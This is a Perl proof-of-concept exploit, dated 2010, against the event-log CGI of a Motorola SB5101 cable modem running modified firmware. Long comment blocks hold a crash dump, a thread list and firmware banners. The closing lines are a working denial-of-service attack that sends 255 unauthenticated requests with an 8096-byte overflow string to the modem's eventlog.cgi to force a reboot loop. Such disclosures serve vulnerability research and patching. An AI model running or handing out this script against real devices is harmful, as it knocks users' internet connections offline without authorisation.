#!/usr/bin/perl

# Motorola SB5101 Hax0rware Event Reset Remote Overflow
# Tested on Hax0rware 1.1 R30, R32 and R39
# Author: Dillon Beresford
# Date: 6/6/2010
# Vendor: Motorola Corporation and SBHacker ( SBHacker has been notified of the vuln ).
# Software Link: http://www.sbhacker.net/forum/index.php
# Description: Motorola SB5101 Hax0rware Event Reset Remote Buffer Overflow 
# An unauthenticated attacker could send multiple log reset requests to eventlog.cgi,
# causing a a denial of service, which would send the cable modem into a reboot loop.
# For debugging telnet into the device 192.168.100.1 and run the poc.

# >>> YIKES... looks like you may have a problem! <<< 

# r0/zero=00000000 r1/at  =80510000 r2/v0  =00000000 r3/v1  =00000002
# r4/a0  =ac100102 r5/a1  =00000000 r6/a2  =00000001 r7/a3  =8069b914
# r8/t0  =00000001 r9/t1  =00000000 r10/t2 =00000001 r11/t3 =00000000
# r12/t4 =00000000 r13/t5 =00000000 r14/t6 =00000000 r15/t7 =00000005
# r16/s0 =807bd04c r17/s1 =807bd004 r18/s2 =807bd000 r19/s3 =8069bb90
# r20/s4 =8069bb88 r21/s5 =11110015 r22/s6 =11110016 r23/s7 =11110017
# r24/t8 =00000000 r25/t9 =00000009 r26/k0 =807d2698 r27/k1 =8069bc7c
# r28/gp =80458fa0 r29/sp =8069b910 r30/fp =8069b970 r31/ra =80197d24

# PC   : 0x80197e14    error addr: 0xac100102
# cause: 0x00000010    status:     0x1000ff03

# BCM interrupt enable: fffffff7, status: 00000000
# Instruction at PC: 0x8c830000

# entry 80197c58    called from 801dbe10
# entry 801dbd08    called from 80242f64
# entry 80242eb8    called from 802fb2e4
# entry 802fb2ac    called from 802fb2a4
# entry 802fb2ac  Return address (00000000) invalid.  Trace stops.

# Task: NetToMedia Thread
# ---------------------------------------------------
# ID:               0x0025
# Handle:           0x8069ba24
# Set Priority:     23
# Current Priority: 23
# State:            SUSP
# Stack Base:       0x8069a9b0
# Stack Size:       4096 bytes
# Stack Used:       1088 bytes
#                                                                   Stack     Stack    Stack
#   TaskId               TaskName              Priority   State      Size      Used     Margin
# ---------- --------------------------------  --------  --------  --------  --------  --------
# 0x8048f818                     Idle Thread      31         RUN     2048      1064       984
# 0x805131d0           Network alarm support       6       SLEEP     2256      1232      1024
# 0x804924c8                 Network support       7       SLEEP     8192      1824      6368
# 0x80513f20                pthread.00000800      15        EXIT     7852      1104      6748
# 0x8048a1c8                        tStartup      18       SLEEP    12288      5208      7080
# 0x8054b9ac                     Rajko HttpD      23       SLEEP     3280      2164      1116
# 0x807f579c      NonVol Device Async Helper      25       SLEEP     3072       504      2568
# 0x807ebc7c  Motorola Standby Switch Thread      23       SLEEP     4096       440      3656
# 0x807ea984      Motorola Vendor Ctl Thread      23       SLEEP     4096       512      3584
# 0x807f64e8                            WDOG      17         RUN     5120      2784      2336
# 0x807e8eb0                 BFC Ping Thread      29       SLEEP     6144       476      5668
# 0x807e870c                   ConsoleThread      27         RUN    36864      2168     34696
# 0x807d6c58                         TelnetD      23         RUN     2256      2040       216
# 0x807ca564                    CfgVB Thread      23       SLEEP     4096       516      3580
# 0x807c5400                            DHCM      25       SLEEP    16384       516     15868
# 0x807bf390                           Event      25       SLEEP        0         0         0 OVERFLOW
# 0x8079a900              Time Of Day Thread      23       SLEEP     6144       460      5684
# 0x8079ad70                CmDocsisIpThread      23       SLEEP     8192       508      7684
# 0x80793edc                 CmBpiManagerThd      25       SLEEP     8192       512      7680
# 0x8079035c                     CmDsxHelper      23       SLEEP     8192       508      7684
# 0x807ac334               CmDocsisCtlThread      21       SLEEP     8192       516      7676
# 0x80789228          Scan Downstream Thread      23       SLEEP     4096      1416      2680
# 0x80786004              RateShaping Thread      23       SLEEP     4096       448      3648
# 0x807f65e0                            CMHL      23       SLEEP     4500       372      4128
# 0x807f66d8                            CMHH      21       SLEEP     4500       356      4144
# 0x807f67d0                            ENRX      23       SLEEP     4500      1248      3252
# 0x807f68c8                            ENTX      23       SLEEP     4500       788      3712
# 0x807f69c0                            ELNK      23       SLEEP     4500       324      4176
# 0x807f6ab8                            USTX      23       SLEEP     4500       344      4156
# 0x807f6bb0                            USRX      23       SLEEP     4500       376      4124
# 0x807f6ca8                            UBCT      19       SLEEP     4500       360      4140
# 0x807f6da0                            USRN      23       SLEEP     4500       344      4156
# 0x806a5e18              DHCP Client Thread      23       SLEEP    12288       512     11776
# 0x807f6e98                        IpHalIst      23         RUN     4500       816      3684
# 0x8069ff7c              CmPropaneCtlThread      23       SLEEP     8192      1632      6560
# 0x8069d320                     IGMP Thread      23       SLEEP     4096       460      3636
# 0x8069ba24               NetToMedia Thread      23        SUSP     4096      1088      3008
# 0x8069798c                     Trap Thread      23       SLEEP    16384       504     15880
# 0x807f6030                     SNMP Thread      23       SLEEP    20480      1196     19284
# 0x805aaf20              DHCP Server Thread      23       SLEEP     8192      1448      6744
# 0x8047b410                    tNonVolTimer      30       SLEEP     2048       292      1756

#           *         *
#          ***       ***
#          ***       ***
#          ***       ***
#         *****     *****
#         *****     *****
#         *****     *****
#        *******   *******
#        *******   *******
#        *******   *******
#       ********* *********
#       ********* *********
#       ****  *** ***  ****
#      ***      ***      ***
#      ***       *       ***
#      **                 **
#     **                   **
#     **                   **
#    **                     **
#    *                       *
#      Motorola  Corporation

# +----------------------------------------------------------------------------+
# |       _/_/     _/_/_/_/    _/_/                                            |
# |      _/  _/   _/        _/    _/   Broadband                               |
# |     _/  _/   _/        _/                                                  |
# |    _/_/     _/_/_/    _/           Foundation                              |
# |   _/  _/   _/        _/                                                    |
# |  _/   _/  _/        _/    _/       Classes                                 |
# | _/_/_/   _/          _/_/                                                  |
# |                                                                            |
# | Copyright (c) 1999 - 2007 Broadcom Corporation                             |
# |                                                                            |
# | Revision:  3.9.33.3 RELEASE                                                |
# |                                                                            |
# | Features:  Console Nonvol Fat HeapManager SNMP Networking USB1.1           |
# +----------------------------------------------------------------------------+
# | Standard Embedded Target Support for BFC                                   |
# |                                                                            |
# | Copyright (c) 2003 - 2007 Broadcom Corporation                             |
# |                                                                            |
# | Revision:  3.0.1 RELEASE                                                   |
# |                                                                            |
# | Features:  PID=0xc011 Bootloader-Rev=2.1.6d                                |
# | Copyright (c) 2003 - 2007 Broadcom Corporation                             |
# |                                                                            |
# | Revision:  3.0.1 RELEASE                                                   |
# |                                                                            |
# | Features:  PID=0xc011 Bootloader-Rev=2.1.6d                                |
# | Features:  Bootloader-Compression-Support=0x19                             |
# +----------------------------------------------------------------------------+
# | eCos BFC Application Layer                                                 |
# |                                                                            |
# | Copyright (c) 1999 - 2007 Broadcom Corporation                             |
# |                                                                            |
# | Revision:  3.0.2 RELEASE                                                   |
# |                                                                            |
# | Features:  eCos Console Cmds, (no Idle Loop Profiler)                      |
# +----------------------------------------------------------------------------+
# |         _/_/    _/     _/                                                  |
# |      _/    _/  _/_/ _/_/   DOCSIS Cable Modem                              |
# |     _/        _/  _/ _/                                                    |
# |    _/        _/     _/                                                     |
# |   _/        _/     _/                                                      |
# |  _/    _/  _/     _/                                                       |
# |   _/_/    _/     _/                                                        |
# |                                                                            |
# | Copyright (c) 1999 - 2005 Broadcom Corporation                             |
# |                                                                            |
# | Revision:  3.9.33.3 RELEASE                                                |
# |                                                                            |
# | Features:  AckCel(tm) DOCSIS 1.0/1.1/2.0 Propane(tm) CM SNMP w/Factory MIB |
# | Features:  Support CM Vendor Extension                                     |
# +----------------------------------------------------------------------------+
# | Motorola Data-Only CM Vendor Extension                                     |
# |                                                                            |
# | Revision:  3.0.0a RELEASE                                                  |
# |                                                                            |
# | Features:  DHCP Server  HTTP Server                                        |
# +----------------------------------------------------------------------------+
# | Build Date:  Apr 29 2009                                                   |
# | Build Time:  15:08:51                                                      |
# | Built By:    vobadm02                                                      |
# +----------------------------------------------------------------------------+

use LWP::Simple;

my $junk = "\x31" x 8096;

print "+---------------------------------------------------------------+\n".
      "| Motorola SB5101 Hax0rware Event Reset Remote Overflow         |\n".
      "| Motorola: SB5101-2.7.6.0-GA-00-NOSH                           |\n".
      "| Version: 1.1 R30, R32 and R39                                 |\n".
      "| Vendor: Motorola Corporation and SBHacker                     |\n".
      "| Author: Dillon Beresford                                      |\n".
      "| Date: 6/6/2010                                                |\n".
      "+---------------------------------------------------------------+\n";

for ($count = 1; $count < 256; $count++)
{
        $contents = get("http://192.168.100.1/eventlog.cgi?reset=".$junk);
        print "sending request to cable modem\n";
}

print "We killed it!\n";
